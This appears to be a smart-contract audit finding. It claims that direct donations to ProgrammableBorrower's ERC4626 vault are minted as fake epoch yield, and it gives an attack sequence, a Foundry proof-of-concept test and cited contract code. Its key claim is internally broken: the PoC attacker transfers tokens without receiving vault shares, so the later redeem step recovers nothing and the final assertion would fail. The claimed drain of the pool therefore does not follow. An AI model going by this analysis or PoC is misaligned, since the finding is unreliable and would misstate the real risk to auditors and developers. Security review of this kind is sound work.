### Title
Direct donations to the programmable borrower's ERC4626 vault are minted as fake epoch yield - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` calculates epoch profit from `convertToAssets()` on its ERC4626 position, but does not distinguish vault share-price increases caused by genuine yield from inflation caused by a third-party donation or deposit. An unprivileged direct token sender can donate underlying to the configured vault during a running epoch, causing `totalInterestDueNow()` to report the donated amount as pool yield. `IdleCDOEpochVariant.stopEpoch()` then mints that amount in strategy tokens and distributes it through tranche NAV, even though the donor can withdraw the donated assets afterward.

### Finding Description
During `onStartEpoch`, `ProgrammableBorrower` snapshots `epochStartVaultAssets` from the assets backing only its own vault shares [1](#0-0) . While the epoch is active, `_vaultNetInterest()` treats any increase in `vault.convertToAssets(vault.balanceOf(address(this)))` as epoch interest [2](#0-1) . `totalInterestDueNow()` exposes that inflated vault gain to the CDO [3](#0-2) .

When the epoch stops, `_resolveStopEpochInterest()` accepts the programmable borrower's value as authoritative [4](#0-3) . In minted-interest mode the CDO calls `mintStrategyTokens(_grossInterest)` and then updates tranche accounting, increasing LP NAV without receiving the donated underlying [5](#0-4) . The anti-donation skim only protects raw underlying held by the CDO and does not isolate donations inside the external ERC4626 vault [6](#0-5) .

### Impact Explanation
A donation of `D` underlying to the ERC4626 vault creates approximately `D` of phantom `totalInterestDueNow()`. The CDO mints `D` strategy tokens and raises AA/BB NAV by that amount. After `stopEpoch`, the attacker redeems or withdraws the donated vault assets, leaving the vault's real attributable assets back near their pre-donation value while the CDO retains inflated NAV.

The result is a solvency break rather than a transient accounting discrepancy: future withdrawal requests are priced from inflated tranche NAV and are ultimately paid from borrower liquidity or other pool assets. The quantified bad-debt/loss capacity is bounded by the attacker-controlled ERC4626 price manipulation, up to the pool's remaining liquidity. In an ERC4626 vault where donations can move `convertToAssets()` arbitrarily, up to the full pool NAV can be crystallized as unbacked yield and later drained through normal withdrawal claims.

### Likelihood Explanation
The attacker only needs to be a direct underlying-token sender or a user able to deposit into the configured ERC4626 vault. No privileged role, borrower cooperation, KYC status, or malicious manager is required.

The sequence is:

1. Wait until an epoch is running.
2. Donate underlying directly to the vault, or deposit with the attacker as receiver if that raises the value of `ProgrammableBorrower`'s shares.
3. Have the honest owner or manager call `stopEpoch()` after `epochEndDate`.
4. Withdraw or redeem the donated assets from the ERC4626 vault.
5. Leave the CDO with minted strategy tokens and inflated tranche prices unsupported by pool assets.

Existing checks do not stop this: `_checkProgrammableBorrowerMode()` only enforces minted interest and no pending instant withdrawals [7](#0-6) ; `_skimDonatedAssets()` cannot see assets donated to the external vault; and `onStopEpoch()` validates only liquidity needed for withdrawals, not the provenance of vault appreciation [8](#0-7) .

### Recommendation
Do not value programmable-borrower yield with raw `convertToAssets()` alone. Track assets attributable specifically to the `ProgrammableBorrower` position and exclude externally supplied appreciation.

A robust fix should use one or more of:

- Snapshot vault share balance and require a share-neutral valuation checkpoint that excludes direct asset donations.
- Compare `convertToAssets()` against a governance-configured/reference price per share rather than accepting spot ERC4626 appreciation.
- Realize yield only by redeeming or withdrawing assets into `ProgrammableBorrower`, and treat unsolicited vault-side appreciation as donation dust rather than borrower interest.
- Keep a dedicated PPS checkpoint at epoch start and validate the ending PPS against a bounded oracle/reference value.
- Restrict usable vaults to donation-resistant ERC4626 implementations and document this requirement as part of borrower deployment.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {IERC4626} from "../contracts/interfaces/IERC4626.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {ProgrammableBorrower} from "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract ProgrammableBorrowerVaultDonationPoC is Test {
    IERC20Detailed underlying;
    IERC4626 vault;
    IdleCDOEpochVariant cdo;
    ProgrammableBorrower programmableBorrower;

    address manager = address(0x100);
    address attacker = address(0xA11CE);

    function testVaultDonationMintsUnbackedEpochInterest() external {
        uint256 donation = 1_000e6;

        // State: epoch is running, isProgrammableBorrower == true,
        // isInterestMinted == true, and programmableBorrower owns vault shares.
        uint256 navBefore = cdo.getContractValue();
        uint256 attributableAssetsBefore =
            vault.convertToAssets(vault.balanceOf(address(programmableBorrower)));

        // Attacker inflates the ERC4626 conversion rate without acquiring pool NAV.
        // A direct underlying transfer is sufficient for a donation-susceptible vault.
        deal(address(underlying), attacker, donation);
        vm.prank(attacker);
        underlying.transfer(address(vault), donation);

        uint256 attributableAssetsAfterDonation =
            vault.convertToAssets(vault.balanceOf(address(programmableBorrower)));
        assertEq(
            attributableAssetsAfterDonation - attributableAssetsBefore,
            donation,
            "donation is reported as vault yield"
        );

        // The vault does not distinguish donation from profit.
        assertEq(
            programmableBorrower.vaultInterestAccrued(),
            donation,
            "donation became epoch interest"
        );
        assertEq(
            programmableBorrower.totalInterestDueNow(),
            donation,
            "CDO will consume the fake yield"
        );

        vm.warp(cdo.epochEndDate() + 1);
        vm.prank(manager);
        cdo.stopEpoch(0, 0);

        // CDO minted strategy tokens equal to the donated amount.
        assertApproxEqAbs(
            cdo.getContractValue(),
            navBefore + donation,
            1,
            "donation crystallized into LP NAV"
        );

        // Attacker exits the donated value from the external vault.
        vm.prank(attacker);
        vault.redeem(vault.balanceOf(attacker), attacker, attacker);

        // The CDO NAV remains inflated while the programmable borrower's vault
        // sleeve no longer contains the donated backing. Later withdrawal claims
        // consume borrower/pool liquidity instead of the attacker's assets.
        assertApproxEqAbs(cdo.getContractValue(), navBefore + donation, 1);
        assertLt(
            vault.convertToAssets(vault.balanceOf(address(programmableBorrower))),
            attributableAssetsAfterDonation,
            "donated backing was removed"
        );
    }
}
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L206-223)
```text
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L231-267)
```text
  function onStopEpoch(uint256 _amountRequired, bool _isRequestingAllFunds) external nonReentrant returns (bool success) {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // if we want to close the pool and the borrower still owes any amount, consider it a failure and let IdleCDO handle it as a default instead of a close. 
    if (_isRequestingAllFunds && (borrowerPrincipal != 0 || borrowerInterestDebt != 0 || borrowerInterestAccrued != 0)) {
      return false;
    }

    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
    }

    // `totalInterestDueNow()` was already read by IdleCDO before calling this hook, so once the
    // stop flow begins we can clear the previous carry and snapshot the remaining vault sleeve
    // as the baseline for measuring buffer-period vault PnL before the next epoch starts.
    bufferedVaultDelta = 0;
    bufferInterest = 0;
    bufferStartVaultAssets = _currentVaultAssets();

    // Stop reserving epoch-end withdraw liquidity once IdleCDO has started the stop flow.
    epochPendingWithdraws = 0;
    epochAccountingActive = false;
    emit EpochAccountingStopped();
    success = true;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L325-334)
```text
  /// @notice Total net epoch interest due to the pool at stop.
  /// @dev This is the single value read by IdleCDO to price the epoch: borrower contractual
  /// interest plus paid buffer interest plus positive vault PnL minus vault losses. It is a
  /// pool-facing value, so it can be lower than `borrowerInterestDebt` when the borrower still
  /// owes full contractual interest but the vault sleeve suffered a loss.
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L337-347)
```text
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L103-107)
```text
  /// @notice Ensure programmable borrowers are only used with minted-interest accounting.
  /// @dev Programmable borrower flows assume minted interest and do not support instant funding.
  function _checkProgrammableBorrowerMode() internal view {
    _checkNotAllowed(isProgrammableBorrower && (!isInterestMinted || _pendingInstant() != 0));
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L428-449)
```text
      if (_mintInterest) {
        // if interest is not transferred we mint strategy tokens equal to the full epoch interest
        if (_grossInterest != 0) _strategy.mintStrategyTokens(_grossInterest);
        // and increase unclaimedFees by pending withdraw fees before _updateAccounting
        unclaimedFees += _pendingWithdrawFees;
      }

      // update tranche prices and unclaimed fees
      _updateAccounting();

      // transfer fees
      uint256 _fees = unclaimedFees;
      if (_mintInterest) {
        // If interest is minted then we mint new shares for fee receivers instead of transferring underlyings
        if (_fees != 0) {
          uint256 feeReceiverAmount = _feeReceiverAmount(_fees);
          if (feeReceiverAmount != 0) {
            _mintSharesAtCurrPrice(feeReceiverAmount, feeReceiver, AATranche);
          }
          _mintSharesAtCurrPrice(_fees - feeReceiverAmount, owner(), AATranche);
          _updateSplitRatio(_getAARatio(true));
        }
```

**File:** contracts/IdleCDOEpochVariant.sol (L793-796)
```text
  /// @notice Transfer donated assets to the feeReceiver
  function _skimDonatedAssets() internal {
    _transferUnderlyings(feeReceiver, _contractTokenBalance(token));
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L997-1005)
```text
  /// @notice Resolve the stop-epoch interest value, optionally sourcing it from a programmable borrower.
  /// @dev Programmable borrowers are always the source of truth for epoch interest.
  /// In that mode `_interest` values `0` and `1` both resolve to the realized epoch interest,
  /// while `1` still separately signals the close-pool path to the caller.
  function _resolveStopEpochInterest(uint256 _interest) internal view returns (uint256 _resolvedInterest) {
    if (isProgrammableBorrower) {
      _checkNotAllowed(_interest > 1);
      return IProgrammableBorrower(_borrower()).totalInterestDueNow();
    }
```
